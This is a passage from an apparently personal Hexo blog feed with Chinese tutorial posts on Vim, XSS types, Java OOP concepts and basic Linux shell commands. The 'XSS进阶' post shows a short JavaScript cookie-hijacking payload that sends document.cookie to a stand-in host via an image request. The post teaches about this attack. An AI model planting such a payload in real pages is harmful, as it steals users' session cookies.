光标位置前面插入</p><p><code>a</code>光标位置后面插入</p><p><code>o</code>直接下一行插入 </p><p><code>x</code>删除光标所在字符</p><p><code>dd</code>删除整个一行</p><p><code>u</code>撤销</p><p><code>dw</code>删除所在光标所在的单词</p><p><code>b</code>跳越单词首字母（往前跳跃）</p><p><code>e</code>跳跃单词最后</p><p><code>w</code>跳跃下一个单词的首字母</p><p><code>shift + w</code>,<code>shift + b</code>,<code>shift + e</code>大跳</p><p><code>r</code>替换一个</p><p><code>R</code>替换任意</p><h2 id="跳跃行首行尾"><a href="#跳跃行首行尾" class="headerlink" title="跳跃行首行尾"></a>跳跃行首行尾</h2><p><code>shift + 6</code>跳到行首</p><p><code>shift + 4</code>跳到行尾</p><h2 id="大括号跳跃函数段落"><a href="#大括号跳跃函数段落" class="headerlink" title="大括号跳跃函数段落"></a>大括号跳跃函数段落</h2><p><code>&#123;&#125;</code></p><h2 id="复制剪切粘贴"><a href="#复制剪切粘贴" class="headerlink" title="复制剪切粘贴"></a>复制剪切粘贴</h2><p><code>p</code>粘贴</p><p><code>y</code>复制</p><p><code>y + w</code>复制这个单词</p><p><code>y + $</code>从当前复制到末尾</p><h2 id="Visual可视化模式"><a href="#Visual可视化模式" class="headerlink" title="Visual可视化模式"></a>Visual可视化模式</h2><h2 id="视图模式的其他用法"><a href="#视图模式的其他用法" class="headerlink" title="视图模式的其他用法"></a>视图模式的其他用法</h2><h2 id="查找和替换"><a href="#查找和替换" class="headerlink" title="查找和替换"></a>查找和替换</h2><h2 id="基础配置"><a href="#基础配置" class="headerlink" title="基础配置"></a>基础配置</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;简单介绍&quot;&gt;&lt;a href=&quot;#简单介绍&quot; class=&quot;headerlink&quot; title=&quot;简单介绍&quot;&gt;&lt;/a&gt;简单介绍&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Vim&lt;/strong&gt;是从&lt;a class=&quot;link&quot;   href=&quot;htt</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>XSS进阶</title>
    <link href="http://jacen-cpu.github.io/2021/04/06/XSS%E8%BF%9B%E9%98%B6/"/>
    <id>http://jacen-cpu.github.io/2021/04/06/XSS%E8%BF%9B%E9%98%B6/</id>
    <published>2021-04-06T09:16:39.000Z</published>
    <updated>2021-05-28T13:42:16.534Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XSS-Payload"><a href="#XSS-Payload" class="headerlink" title="XSS Payload"></a>XSS Payload</h1><p>XSS Payload是指用以完成各种具体功能的脚本(主要Javascript)。</p><p>例如Cookie劫持：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="built_in">document</span>.CreateElement(<span class="string">&quot;img&quot;</span>);</span><br><span class="line">img.src = <span class="string">&quot;http://www.XSS.com/log?&quot;</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie);</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(img);</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;XSS-Payload&quot;&gt;&lt;a href=&quot;#XSS-Payload&quot; class=&quot;headerlink&quot; title=&quot;XSS Payload&quot;&gt;&lt;/a&gt;XSS Payload&lt;/h1&gt;&lt;p&gt;XSS Payload是指用以完成各种具体功能的脚本(主要Javas</summary>
      
    
    
    
    <category term="web" scheme="http://jacen-cpu.github.io/categories/web/"/>
    
    
  </entry>
  
  <entry>
    <title>XSS简介</title>
    <link href="http://jacen-cpu.github.io/2021/04/03/XSS%E7%AE%80%E4%BB%8B/"/>
    <id>http://jacen-cpu.github.io/2021/04/03/XSS%E7%AE%80%E4%BB%8B/</id>
    <published>2021-04-03T02:55:15.000Z</published>
    <updated>2021-05-28T13:21:57.806Z</updated>
    
    <content type="html"><![CDATA[<p>XSS英文全称(Cross Site Script),为了和CSS进行区别，在安全领域叫做”XSS”。XSS根据效果的不同分成三类:反射型，储存型，DOM Based XSS。</p><h1 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h1><p>它只是简单地把用户输入的数据反射给服务器。实现方式是黑客诱导用户点击恶意链接。</p><img src="/2021/04/03/XSS%E7%AE%80%E4%BB%8B/Non-persistentXSS.png" class=""><h1 id="储存型XSS"><a href="#储存型XSS" class="headerlink" title="储存型XSS"></a>储存型XSS</h1><p>它把用户输入的数据储存在服务器，这种方法具有很强的稳定性。</p><img src="/2021/04/03/XSS%E7%AE%80%E4%BB%8B/PersistentXSS.png" class=""><h1 id="DOM-Based-XSS"><a href="#DOM-Based-XSS" class="headerlink" title="DOM Based XSS"></a>DOM Based XSS</h1><p>从效果上来说，这也是反射型的XSS。其实现方法是修改页面的DOM节点。</p><img src="/2021/04/03/XSS%E7%AE%80%E4%BB%8B/DOMBasedXSS.png" class="">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;XSS英文全称(Cross Site Script),为了和CSS进行区别，在安全领域叫做”XSS”。XSS根据效果的不同分成三类:反射型，储存型，DOM Based XSS。&lt;/p&gt;
&lt;h1 id=&quot;反射型XSS&quot;&gt;&lt;a href=&quot;#反射型XSS&quot; class=&quot;hea</summary>
      
    
    
    
    <category term="web" scheme="http://jacen-cpu.github.io/categories/web/"/>
    
    
  </entry>
  
  <entry>
    <title>OOP多态</title>
    <link href="http://jacen-cpu.github.io/2021/04/03/OOP%E5%A4%9A%E6%80%81/"/>
    <id>http://jacen-cpu.github.io/2021/04/03/OOP%E5%A4%9A%E6%80%81/</id>
    <published>2021-04-02T23:02:00.000Z</published>
    <updated>2021-04-02T23:37:12.217Z</updated>
    
    <content type="html"><![CDATA[<h1 id="OOP多态"><a href="#OOP多态" class="headerlink" title="OOP多态"></a>OOP多态</h1><h2 id="“is-a”规则（置换规则）"><a href="#“is-a”规则（置换规则）" class="headerlink" title="“is-a”规则（置换规则）"></a>“is-a”规则（置换规则）</h2><p>我们举个例子吧。如果我们有一个类叫做动物。显然我们可以创建一个动物的对象。接着我们考虑动物是一个超类，它有一个子类叫做“狗”。逻辑上来讲狗是动物，但是动物不一定是狗。因此我们可以进行这样的操作：将狗的对象赋值给动物类的变量。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Anmial dogs = <span class="keyword">new</span> Dogs();</span><br></pre></td></tr></table></figure><p>因此在JAVA程序设计中对象变量是多态的。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;OOP多态&quot;&gt;&lt;a href=&quot;#OOP多态&quot; class=&quot;headerlink&quot; title=&quot;OOP多态&quot;&gt;&lt;/a&gt;OOP多态&lt;/h1&gt;&lt;h2 id=&quot;“is-a”规则（置换规则）&quot;&gt;&lt;a href=&quot;#“is-a”规则（置换规则）&quot; class=&quot;head</summary>
      
    
    
    
    <category term="JAVA" scheme="http://jacen-cpu.github.io/categories/JAVA/"/>
    
    
  </entry>
  
  <entry>
    <title>OOP继承</title>
    <link href="http://jacen-cpu.github.io/2021/03/31/OOP%E7%BB%A7%E6%89%BF/"/>
    <id>http://jacen-cpu.github.io/2021/03/31/OOP%E7%BB%A7%E6%89%BF/</id>
    <published>2021-03-31T00:06:21.000Z</published>
    <updated>2021-03-31T06:11:54.838Z</updated>
    
    <content type="html"><![CDATA[<h1 id="OOP继承"><a href="#OOP继承" class="headerlink" title="OOP继承"></a>OOP继承</h1><p>简单来说继承就是一个抽象到具体，共性到特性，一般到特殊的过程。</p><h2 id="类，超类，子类"><a href="#类，超类，子类" class="headerlink" title="类，超类，子类"></a>类，超类，子类</h2><p>首先我们得了解类，超类，子类这三者的区别。一般被继承的类叫做超类，也叫做父类或是基类。而继承的类叫做子类，派生类或是孩子类。而类这是一个大的概念就不多做解释了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Dogs</span> <span class="keyword">extends</span> <span class="title">animal</span> </span>&#123;</span><br><span class="line">    <span class="comment">//添加方法和域</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如上述代码这就是定义子类的方法。</p><blockquote><p>在C++中继承的符号是<code> :</code></p></blockquote><h2 id="覆盖方法"><a href="#覆盖方法" class="headerlink" title="覆盖方法"></a>覆盖方法</h2><p>这也叫方法的重写。在IDEA中我们可以这样实现。</p><img src="/2021/03/31/OOP%E7%BB%A7%E6%89%BF/0.png" class=""><p>接着选择override，然后选择你需要重写的方法。</p><img src="/2021/03/31/OOP%E7%BB%A7%E6%89%BF/1.png" class=""><h2 id="子类构造器"><a href="#子类构造器" class="headerlink" title="子类构造器"></a>子类构造器</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Manager</span> <span class="params">(String name, <span class="keyword">double</span> salaty, <span class="keyword">int</span> year, <span class="keyword">int</span> month, <span class="keyword">int</span> day)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>(name, salary, year, month, day);</span><br><span class="line">    bonus = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为子类Manager的构造器无法访问其父类的私有域，这里我们运用了<code>super</code>关键字调用了超类的构造器。并且使用super调用构造器的语句必须是子类构造器的第一条语句。这样子类终于可以实现真正的啃老了！！！</p><blockquote><p>总结：this有两个用途：1.引用隐式参数，2.调用该类的其他构造器。super有两个用途：1.调用超类的方法，2.调用超类的构造器。</p></blockquote><h2 id="多层继承"><a href="#多层继承" class="headerlink" title="多层继承"></a>多层继承</h2><p>这是一个比较有意思的功能。想一想，有父亲和儿子，难道就不能有孙子吗？因此这个继承是可以嵌套的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Animal</span> </span>&#123;&#125;;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Dogs</span> <span class="keyword">extends</span> <span class="title">Animal</span> </span>&#123;&#125;;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LauLaduo</span> <span class="keyword">extends</span> <span class="title">Dogs</span> </span>&#123;&#125;;</span><br></pre></td></tr></table></figure><p>但是JAVA是不支持多继承的(C++支持)，但是你可以用嵌套。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;OOP继承&quot;&gt;&lt;a href=&quot;#OOP继承&quot; class=&quot;headerlink&quot; title=&quot;OOP继承&quot;&gt;&lt;/a&gt;OOP继承&lt;/h1&gt;&lt;p&gt;简单来说继承就是一个抽象到具体，共性到特性，一般到特殊的过程。&lt;/p&gt;
&lt;h2 id=&quot;类，超类，子类&quot;&gt;&lt;a hr</summary>
      
    
    
    
    <category term="JAVA" scheme="http://jacen-cpu.github.io/categories/JAVA/"/>
    
    
  </entry>
  
  <entry>
    <title>OOP封装</title>
    <link href="http://jacen-cpu.github.io/2021/03/30/OOP%E5%B0%81%E8%A3%85/"/>
    <id>http://jacen-cpu.github.io/2021/03/30/OOP%E5%B0%81%E8%A3%85/</id>
    <published>2021-03-30T05:04:57.000Z</published>
    <updated>2021-03-30T13:12:02.616Z</updated>
    
    <content type="html"><![CDATA[<h1 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(age &gt; <span class="number">100</span> || age &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.age = <span class="number">0</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.age;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>get和set这就是OOP封装。OOP封装有很大的优点，此时的age是一个只读域，很好的保护了数据的安全，虽然可以用set来修改他的值，但是我们可以在set里设置判断是否合法的条件。</p><h1 id="好用的工具"><a href="#好用的工具" class="headerlink" title="好用的工具"></a>好用的工具</h1><p>虽然OOP封装有很多优点，但是如果在开发过程中有很多需要封装的实例域，这就会极大地降低效率。在IDEA中我推荐使用lombok。</p><p>首先我们需要安装lombpk插件。</p><img src="/2021/03/30/OOP%E5%B0%81%E8%A3%85/0.png" class=""><p>接着我们在maven库中下载我们所需的架包。</p><img src="/2021/03/30/OOP%E5%B0%81%E8%A3%85/1.png" class=""><img src="/2021/03/30/OOP%E5%B0%81%E8%A3%85/3.png" class="2.png%｝ 最后将架包引入IDEA中。 {%asset_img">]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;封装&quot;&gt;&lt;a href=&quot;#封装&quot; class=&quot;headerlink&quot; title=&quot;封装&quot;&gt;&lt;/a&gt;封装&lt;/h1&gt;&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span c</summary>
      
    
    
    
    <category term="JAVA" scheme="http://jacen-cpu.github.io/categories/JAVA/"/>
    
    
  </entry>
  
  <entry>
    <title>JAVA中的static</title>
    <link href="http://jacen-cpu.github.io/2021/03/24/JAVA%E4%B8%AD%E7%9A%84static/"/>
    <id>http://jacen-cpu.github.io/2021/03/24/JAVA%E4%B8%AD%E7%9A%84static/</id>
    <published>2021-03-24T07:07:44.000Z</published>
    <updated>2021-03-30T00:28:18.596Z</updated>
    
    <content type="html"><![CDATA[<h1 id="静态域"><a href="#静态域" class="headerlink" title="静态域"></a>静态域</h1><p>如果将域定义为static,那么每个类只有这样一个域。例如我们需要给每个雇员给定一个唯一的标识符：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Employee</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> nextId = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里给Employee类添加了一个实例域id和一个静态域<code>nextId</code>,这个静态域即使是没有对象存在，它也是存在的，<strong>因为它不属于如何对象，它属于类。</strong></p><h1 id="静态常量"><a href="#静态常量" class="headerlink" title="静态常量"></a>静态常量</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Math</span> </span>&#123;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">double</span> PI = <span class="number">3.14159265358979323846</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上例子中PI就是一个静态常量,只有通过<code> Math.PI</code>才能访问。在举一个奇特例子，我们经常使用的<code>Sysem.out </code>的out其实也是静态常量。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">System</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> out = ...;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="静态方法"><a href="#静态方法" class="headerlink" title="静态方法"></a>静态方法</h1><p>静态方法是一种不能向对象实施操作的方法。它不能使用任何类的对象，换句话说没有隐式的参数。但是静态方法可以访问自类中的静态域。如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">getNextId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> nextId;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以通过类名调用这个方法：</p><p><code>int n = Employee.getNextId();</code> </p><p>静态方法的使用主要出现在一下两种情况：</p><ol><li>一个方法不需要访问对象状态，所需的参数都是显示参数提供的。</li><li>一个方法只需访问类的静态域。</li></ol><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><h2 id="private-static"><a href="#private-static" class="headerlink" title="private static"></a>private static</h2><p>我们先看一看<code>public static</code>，既然有了public，那么每个类的对象都可以对公有域的值经行修改。于是就到了我们所提到的<code>private static</code>,但是我们如何得到它的值呢？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String Plot = <span class="string">&quot;JOJO&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String getPlotInstance &#123;</span><br><span class="line">    <span class="keyword">return</span> Plot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以用一个get方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(Dogs.getPlotInstance);<span class="comment">//这里的Dogs是一个类名。</span></span><br></pre></td></tr></table></figure><h2 id="static单例模式"><a href="#static单例模式" class="headerlink" title="static单例模式"></a>static单例模式</h2><p>直接上代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Earth</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Earth instance = <span class="keyword">new</span> Earth();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> Earth &#123;&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Earth <span class="title">getIntance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码叼就叼在第二行的<code>private Earth</code>,这个private让你不能new。我们只能让你用<code>getInstance()</code>方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Earth earthinstance = Earth.getIntance();</span><br></pre></td></tr></table></figure><p>所有你只能new唯一个例子，这种模式的高级叫法是：static单例模式。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;静态域&quot;&gt;&lt;a href=&quot;#静态域&quot; class=&quot;headerlink&quot; title=&quot;静态域&quot;&gt;&lt;/a&gt;静态域&lt;/h1&gt;&lt;p&gt;如果将域定义为static,那么每个类只有这样一个域。例如我们需要给每个雇员给定一个唯一的标识符：&lt;/p&gt;
&lt;figure clas</summary>
      
    
    
    
    <category term="JAVA" scheme="http://jacen-cpu.github.io/categories/JAVA/"/>
    
    
  </entry>
  
  <entry>
    <title>GNU基础shell命令（二）</title>
    <link href="http://jacen-cpu.github.io/2021/02/19/GNU%E5%9F%BA%E7%A1%80shell%E5%91%BD%E4%BB%A4%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <id>http://jacen-cpu.github.io/2021/02/19/GNU%E5%9F%BA%E7%A1%80shell%E5%91%BD%E4%BB%A4%EF%BC%88%E4%BA%8C%EF%BC%89/</id>
    <published>2021-02-19T14:37:44.000Z</published>
    <updated>2021-03-06T13:57:54.973Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ln命令"><a href="#ln命令" class="headerlink" title="ln命令"></a><strong>ln命令</strong></h2><p><strong>链接文件</strong></p><ol><li><p>符号链接（软链接）——快捷方式</p><p><code>ln -s (文件)（链接名）</code></p></li><li><p>硬链接(<em>只能在一个硬盘里</em>)</p><p><code>ln (文件)（链接名） </code></p></li></ol><h2 id="mv命令"><a href="#mv命令" class="headerlink" title="mv命令"></a>mv命令</h2><p>**mv命令-**用来对文件或目录重新命名，或者将文件从一个目录移到另一个目录中。</p><p><strong>重命名</strong></p><p><code>mv (原名) (重命名)</code></p><p><strong>移动</strong></p><p>将目录<code>/usr/men</code>中的所有文件移到当前目录（用<code>.</code>表示）中：</p><p><code>mv /usr/men/* . </code></p><p>移动文件 :</p><p><code>mv file_1.txt /home/office/ </code></p><p>移动多个文件 </p><p><code>mv file_2.txt file_3.txt file_4.txt /home/office/</code></p><p><code>mv *.txt /home/office/ </code></p><p>移动目录</p><p><code>mv ../doc/ ~</code></p><h2 id="rm命令"><a href="#rm命令" class="headerlink" title="rm命令"></a>rm命令</h2><p><strong>rm-用于删除给定的文件和目录</strong> </p><p>-d：直接把欲删除的目录的硬连接数据删除成0，删除该目录；</p><p>-f：强制删除文件或目录；</p><p>-i：删除已有文件或目录之前先询问用户；</p><p>-r或-R：递归处理，将指定目录下的所有文件与子目录一并处理；</p><p>–preserve-root：不对根目录进行递归操作；</p><p>-v：显示指令的详细执行过程；</p><h2 id="mkdir命令"><a href="#mkdir命令" class="headerlink" title="mkdir命令"></a>mkdir命令</h2><p><strong>mkdir-用来创建目录</strong></p><p>在目录<code>/fuck/kk</code>下建立子目录test，并且只有文件主有读、写和执行权限，其他人无权访问 </p><p><code>mkdir -m 700 ./fuck/kk/test </code></p><p>在目录<code>/fuck/kk</code>下建立目录kid并建立它的父目录father</p><p><code>mkdir -p ./fuck/kk/father/kid</code></p><h2 id="cat-more-less命令-（查看文件）"><a href="#cat-more-less命令-（查看文件）" class="headerlink" title="cat,more,less命令 （查看文件）"></a>cat,more,less命令 （查看文件）</h2><p><strong>cat-查看文件</strong></p><p><code>cat (文件名)</code></p><p><code>cat -A</code></p><p><code>cat -n</code></p><p>适用于比较短的文件</p><p><strong>more-显示文件内容，每次只显示一屏</strong></p><ul><li>按 <code>Space</code> 键：显示文本的下一屏内容。</li><li>按 <code>Enter</code> 键：只显示文本的下一行内容。</li><li>按斜线符<code>|</code>：接着输入一个模式，可以在文本中寻找下一个相匹配的模式。</li><li>按H键：显示帮助屏，该屏上有相关的帮助信息。</li><li>按B键：显示上一屏内容。</li><li>按Q键：退出more命令</li></ul><p><strong>less-分屏上下翻页浏览文件内容</strong> </p><p>和more类似但是不常用</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;ln命令&quot;&gt;&lt;a href=&quot;#ln命令&quot; class=&quot;headerlink&quot; title=&quot;ln命令&quot;&gt;&lt;/a&gt;&lt;strong&gt;ln命令&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;链接文件&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;符号链接（软链</summary>
      
    
    
    
    <category term="Linux" scheme="http://jacen-cpu.github.io/categories/Linux/"/>
    
    
  </entry>
  
  <entry>
    <title>GNU基础shell命令（一）</title>
    <link href="http://jacen-cpu.github.io/2021/02/16/GNU%E5%9F%BA%E7%A1%80shell%E5%91%BD%E4%BB%A4%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>http://jacen-cpu.github.io/2021/02/16/GNU%E5%9F%BA%E7%A1%80shell%E5%91%BD%E4%BB%A4%EF%BC%88%E4%B8%80%EF%BC%89/</id>
    <published>2021-02-16T13:45:32.000Z</published>
    <updated>2021-07-21T23:40:11.700Z</updated>
    
    <content type="html"><![CDATA[<p>在这里展示是Linux shell命令最基础的部分(<strong>Bash Shell</strong>)，却也是最重要的部分。</p><h2 id="cd命令"><a href="#cd命令" class="headerlink" title="cd命令"></a>cd命令</h2><p><strong>cd-切换用户当前工作目录</strong></p><p>选项：</p><p>-L （默认值）如果要切换到的目标目录是一个符号连接，那么切换到符号连接的目录。</p><p>-P 如果要切换到的目标目录是一个符号连接，那么切换到它指向的物理位置目录。 </p><p>-当前工作目录将被切换到环境变量OLDPWD所表示的目录，也就是前一个工作目录。 </p><p>cd    # 进入用户主目录； </p><p>cd /  # 进入根目录 </p><p>cd ~  # 进入用户主目录； </p><p>cd ..  # 返回上级目录（若当前目录为“/“，则执行完后还在“/“；”..”为上级目录的意思）； </p><p>cd ../..  # 返回上两级目录； </p><p><em>cd !$  # 把上个命令的参数作为cd参数使用。</em> </p><p><strong>pwd-输入当前的目录</strong> </p><p><strong>绝对路径和相对路径</strong></p><p>我们知道所谓路径就是用来定位目标的位置的。所以我们生活中的地址就是个活生生的例子比如我是杭电的一个学生用绝对路径怎么表示呢？</p><p><strong>/银河系/太阳系/地球/亚洲/中国/浙江/杭州/江干区/下沙/杭电</strong>（是不是很蠢）蠢就对了在Linux绝对路径就是这样用的:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /home/jacen/Downloads/</span><br></pre></td></tr></table></figure><img src="/2021/02/16/GNU%E5%9F%BA%E7%A1%80shell%E5%91%BD%E4%BB%A4%EF%BC%88%E4%B8%80%EF%BC%89/Snipaste_2021-02-16_22-17-24.png" class="" title="This is an example image"><p>同样用相对路径是什么说法呢？</p><p>假如我的一个同学在江苏，那么我会告诉他我的地址是 <strong>/浙江/杭州/江干区/下沙/杭电</strong> 很合理（不是吗）同样我们在Linux中这样用:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd Downloads/doc/</span><br></pre></td></tr></table></figure><img src="/2021/02/16/GNU%E5%9F%BA%E7%A1%80shell%E5%91%BD%E4%BB%A4%EF%BC%88%E4%B8%80%EF%BC%89/Snipaste_2021-02-16_22-27-18.png" class="" title="This is an example image"><h2 id="ls命令"><a href="#ls命令" class="headerlink" title="ls命令"></a>ls命令</h2><p><strong>ls命令</strong> 用来显示目标列表，在Linux中是使用率较高的命令</p><p>ls       # 仅列出当前目录可见文件</p><p>ls -l    # 列出当前目录可见文件详细信息 </p><p>ls -a   #列出当前目录的所有文件包括隐藏文件 <em>（隐藏文件名前带点.）</em></p><p>ls -hl   # 列出详细信息并以可读大小显示文件大小 </p><p>ls -al   # 列出所有文件（包括隐藏）的详细信息 <em><strong>（缩写为ll）</strong></em></p><p>du -sh * | sort -h # 按文件大小排序(同上)</p><p>ls -F    #每个目录名加 “/“ 后缀，每个 FIFO 名加 “|” 后缀， 每个可运行名加“ * ”后缀。</p><p>ls -R    #递归列出遇到的子目录</p><p><em>ls -FR</em> </p><img src="/2021/02/16/GNU%E5%9F%BA%E7%A1%80shell%E5%91%BD%E4%BB%A4%EF%BC%88%E4%B8%80%EF%BC%89/Snipaste_2021-02-19_22-26-25.png" class="" title="This is an example image"><h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h3><p><strong>文件扩展匹配符</strong> <code>?</code> <code>*</code></p><p><code>?</code>一个占位符</p><p><code>*</code>多个占位符</p><p><strong>元字符通配符 []</strong> </p><h2 id="touch命令"><a href="#touch命令" class="headerlink" title="touch命令"></a>touch命令</h2><p>*<em>touch的作用是</em>创建新文件<em>或是</em>更新时间* ** </p><p>-a：或–time=atime或–time=access或–time=use  只更改存取时间；</p><p>-c：或–no-create  不建立任何文件；</p><p>-d：&lt;时间日期&gt; 使用指定的日期时间，而非现在的时间；</p><p> -f：此参数将忽略不予处理，仅负责解决BSD版本touch指令的兼容性问题；</p><p>-m：或–time=mtime或–time=modify  只更该变动时间；</p><p>-r：&lt;参考文件或目录&gt;  把指定文件或目录的日期时间，统统设成和参考文件或目录的日期时间相同；</p><p>-t：&lt;日期时间&gt;  使用指定的日期时间，而非现在的时间；</p><p>–help：在线帮助； –version：显示版本信息。 </p><h2 id="cp命令"><a href="#cp命令" class="headerlink" title="cp命令"></a>cp命令</h2><p><strong>cp-将源文件或目录复制到目标文件或目录中</strong> </p><p>-a：此参数的效果和同时指定”-dpR”参数相同； </p><p>-d：当复制符号连接时，把目标文件或目录也建立为符号连接，并指向与源文件或目录连接的原始文件或目录； </p><p>-f：强行复制文件或目录，不论目标文件或目录是否已存在； </p><p>-i：覆盖既有文件之前先询问用户； </p><p>-l：对源文件建立硬连接，而非复制文件； 